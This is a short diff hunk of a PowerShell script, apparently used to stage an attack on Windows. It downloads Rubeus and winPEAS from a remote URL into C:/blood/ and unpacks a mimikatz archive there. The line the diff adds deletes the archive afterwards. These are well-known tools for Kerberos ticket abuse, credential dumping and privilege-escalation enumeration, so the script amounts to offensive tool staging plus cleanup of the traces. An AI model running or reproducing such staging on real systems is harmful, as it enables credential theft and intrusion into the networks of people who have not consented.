@@ -27,3 +27,4 @@ iwr $url_1029384756/tools/Rubeus.exe -OutFile C:/blood/Rubeus.exe
 iwr $url_1029384756/tools/winPEASany_ofs.exe -OutFile C:/blood/winPEASany_ofs.exe
 
 Expand-Archive -LiteralPath 'C:/blood/mimikatz.zip' -DestinationPath 'C:/blood/'
+del mimikatz.zip
